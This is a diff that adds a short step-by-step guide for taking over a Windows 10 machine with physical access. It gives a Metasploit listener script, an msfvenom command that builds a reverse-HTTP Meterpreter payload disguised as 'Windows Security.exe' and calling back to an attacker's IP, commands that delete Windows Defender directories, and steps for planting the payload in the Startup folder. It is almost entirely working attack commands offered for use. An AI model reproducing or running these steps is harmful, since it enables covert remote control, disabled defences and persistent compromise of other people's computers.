@@ -1,0 +1,53 @@
+Hacking into Windows 10 (Requires Physical Access)
+
+Pre-Exploit
+
+Create a Live USB running Kali Linux
+
+Create a resource script:
+
+nano ~/automate.rc
+
+Paste this into the nano terminal:
+
+use multi/handler
+set payload windows/meterpreter/reverse_http
+set LHOST [Attacker's Ip Here]
+set LPORT 80
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j -z
+
+Start msfconsole with this command:
+
+msfconsole -r ~/automate.rc
+
+Create the payload using msfvenom:
+
+msfvenom -encoder cmd/powershell_base64 -payload windows/meterpreter/reverse_http LHOST=[Attacker's IP Here] LPORT=80 -arch x86 -platform win -format exe -out ~/'Windows Security.exe'
+
+After generating this payload, save it to a second USB drive
+
+Exploit
+
+Boot the target device with the Live USB
+
+Mount the Windows volume (Double Click)
+
+Disable defenses:
+
+find /media/root/ -type d -iname *Windows\ Defender*
+
+Remove all of these directories with:
+
+find /media/root/ -type d -iname *Windows\ Defender* -exec rm -rf
+
+Navigate to 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'
+
+If the filesystem is locked, the file must be dragged from the USB to the folder
+
+Unmount the Windows volume
+
+Shut down the computer, start a metasploit listener, and wait for the target computer to be turned on
+
+
